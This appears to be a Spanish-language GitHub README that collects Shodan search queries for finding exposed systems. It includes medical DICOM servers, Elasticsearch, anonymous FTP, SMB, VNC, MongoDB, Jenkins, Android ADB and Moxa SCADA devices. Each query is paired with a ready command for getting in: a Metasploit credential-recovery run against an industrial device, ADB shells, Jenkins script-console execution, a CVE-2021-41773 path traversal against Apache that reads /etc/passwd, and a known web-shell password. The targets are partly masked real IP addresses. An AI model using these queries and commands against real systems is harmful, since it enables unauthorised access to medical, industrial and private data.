# Shodan Dorks 2023

Recopilación de Querys de shodan con scripts personalizados :)

# DICOM 
El estándar DICOM (Digital Imaging and Communications in Medicine) es un estándar utilizado en la industria médica para la gestión, almacenamiento y transmisión de imágenes médicas, como radiografías, tomografías computarizadas (TC), imágenes de resonancia magnética (IRM), entre otras.

```sh
"DICOM Server Response" port:104
```
```sh
python3 Dicom.py
```
![1](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/6da5ac61-5408-47e7-b875-ab64f5dbb8a7)

![2](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/464e7bf2-8873-45e3-83c4-920f5cc68966)

# Elasticsearch
Elasticsearch es un motor de búsqueda y análisis distribuido, de código abierto, basado en Lucene. Se utiliza para indexar, buscar y analizar grandes volúmenes de datos en tiempo real. Está diseñado para manejar datos no estructurados o semiestructurados y es especialmente útil para casos de uso en los que se requiere búsqueda y análisis de texto, logística, monitoreo y análisis de registros, y más

```sh
port:"9200" elastic: "Total Size:"
```
```sh
curl -X GET "http://192.x.x.153:9200/_cat/indices?v"
curl -X GET "http://192.x.x.153:9200/.monitoring-beats-7-2023.08.30"
curl -X GET "http://192.x.x.153:9200/_search?pretty=true"
```

```sh
python3 elastic.py -t 192.x.x.153
```
![3](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/000ddad0-49fd-476d-b1cd-bc3802399c39)

## Access FTP Anonymous
El acceso FTP anónimo es una forma de conectarse a un servidor FTP sin proporcionar credenciales de autenticación específicas.

```sh
"220" "230 Login successful." port:21
230 'anonymous@' login ok 
"Anonymous+access+allowed" port:"21"
```

```sh
shodan search :"220" "230 Login successful." port:21 --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt
```
```sh
python3 ftp.py -l ips.txt
```
![4](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/57453843-fda0-4dcc-a6e1-49157674de94)

# Authentication Disabled SMB
La autenticación SMB (Server Message Block) sin credenciales, también conocida como acceso SMB anónimo, permite a los usuarios acceder a recursos compartidos en una red sin proporcionar nombres de usuario ni contraseñas. Esto puede ser útil para acceder a carpetas compartidas que se han configurado para permitir el acceso anónimo.

```sh
"Authentication: disabled" port:445 product:"Samba" 
```
```sh
smbclient -L //200.x.x.29/ -N  
smbclient //200.x.x.29/info
```
![5](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/31b2ba83-2255-418c-83c1-d0860c957a1c)

## Access authentication disabled VNC
Esto significa que el servidor VNC está configurado para permitir conexiones sin requerir autenticación.

```sh
"authentication disabled" port:5900,5901
```
```sh
vncviewer -passwd none 91.x.x.238
```
![6](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/7e9aa869-aa84-4277-b207-48f91caf90f3)

## Access authentication disabled MongoDB
Esto significa que el servidor NoSQL MongoDB está configurado para permitir conexiones sin requerir autenticación.

```sh
"MongoDB Server Information" port:27017 -authentication
"Set-Cookie: mongo-express=" "200 OK"
```
```sh
mongo --host 139.x.x.5
```
![7](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/2f5f6056-fe19-4914-a794-7d7a85bec742)

## Access Jenkins
Se puede visualizar componentes del servicio Jenkins, ejecutar scripts, etc.

```sh
http.component:"jenkins"
title:"Dashboard [Jenkins]"
html:"Dashboard Jenkins"
```
```sh
add /script 
print "uname -a".execute().text
```
![8](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5c1b5452-bf20-4857-b00f-d3255453825f)

## Access devices ADB
Es una aplicación de terminal que le permite conectarse al servicio ADB shell de otros dispositivos Android a través de la red.

```sh
shodan search :Android Debug Bridge port:5555 "Name:" --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt 
 ```
```sh
python3 adb.py   
```
![9](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/1a5484f7-55ff-4db6-ab0e-22cf6ff2c018)

```sh
adb devices
```
![10](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/7e32e586-a2c6-48e0-b173-bd6f4768148b)

```sh
adb -s 59.x.x.112:5555 shell
```
![11](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/808b7528-01f9-4bbe-8613-85c0b87496cb)


## Access devices SCADA Moxa 
Sistema SCADA que utiliza productos de la marca Moxa para establecer la conectividad y la comunicación con los dispositivos industriales que están siendo monitoreados y controlados en una infraestructura crítica o proceso industrial.

```sh
"Moxa Nport Device" Status: Authentication enabled port:"4800"
"Moxa Nport Device" Status: Authentication disabled port:"4800"
shodan search --separator , --fields ip_str,port,data "Moxa Nport" | awk '{print $1,$2,$3}' FS=":" | tr '\\', ' ' | awk '{print $1,$7,$8}' | column -t | ccze -A
```

```sh
use auxiliary/admin/scada/moxa_credentials_recovery
set FUNCTION CREDS
set rport 4800
set rhosts 212.x.x.14
run
```
![12](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/994f2250-28e1-4cd9-a113-c7a90c11c92e)

```sh
telnet 212.x.x.14
```
![13](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/90258052-da22-40bb-80e2-908a4dff8af3)

## Exploit Infrastructure RCE CVE-2020-0796
La vulnerabilidad CVE-2020-0796 se refiere a una vulnerabilidad de ejecución de código remoto (RCE, por sus siglas en inglés) que afecta al protocolo de compartición de archivos SMBv3 (Server Message Block version 3). SMB es un protocolo utilizado para compartir archivos, impresoras y otros recursos en redes de computadoras. La versión 3 (SMBv3) es una versión moderna de este protocolo utilizada en sistemas operativos Windows.

Esta vulnerabilidad se conoció coloquialmente como "SMBGhost" o "CoronaBlue" y fue anunciada en marzo de 2020. 

```sh
vuln:CVE-2020-0796
country:pe port:445
```
![14](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/78132a91-52f4-4285-862f-b6367ffd9a52)

![15](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/05606a90-4828-491e-8fc7-b34eea27d5eb)

## Exploit Web RCE CVE-2021-41773
```sh
shodan search :apache 2.4.49  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | cat > url.txt
```
![16](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/ce43c1a0-047e-45c3-8a2c-eb18efce51f1)

```sh
curl -k http://210.x.x.7/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
```
![17](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e40e0b5-a665-4133-a61f-5e2c69fb0310)


## Electronic measure

```sh
"Server: EIG Embedded Web Server" "200 Document follows"
```
![18](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/b93bf1c7-af97-4152-9c38-85d907a083c7)

## Search Web shell 

```sh
html:"wso.php"
```
![19](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/0f2644f7-75e6-46eb-992f-5a3f9c41f185)

webshell as default fa769dac7a0a94ee47d8ebe021eaba9e has a match password ghost287

![20](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/668c181b-9040-489a-b074-a6f3e3fdc049)


## Search Backup Files

```sh
html:"web.zip"
"web.zip"
```
![21](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/357e77a7-25b8-4d22-893c-caf382bd18a1)



## OS Windows Obsolete
Tener sistemas Windows obsoletos y sin soporte puede conllevar una serie de peligros y riesgos significativos para la seguridad, la estabilidad y la eficiencia de tus sistemas y datos.


```sh
os:"Windows 5.0" – Windows 2000; support end 2010.
os:"Windows 5.1" – Windows XP; support end 2014.
os:"Windows 2003" – Windows Server 2003; support end 2015.
os:"Windows Vista"– Windows Vista; support end 2017.
os:"Windows 2008" – Windows Server 2008; support end 2020.
os:"Windows 7" – Windows 7; support end 2020.
os:"Windows 8" – Windows 8; support end 2016.
os:"Windows 2011" – Windows Home Server 2011; support end 2016.
os:"Windows 8.1" – Windows 8.1; support end 2018.
os:"Windows 2012" – Windows Server 2012; support end 2018.
```



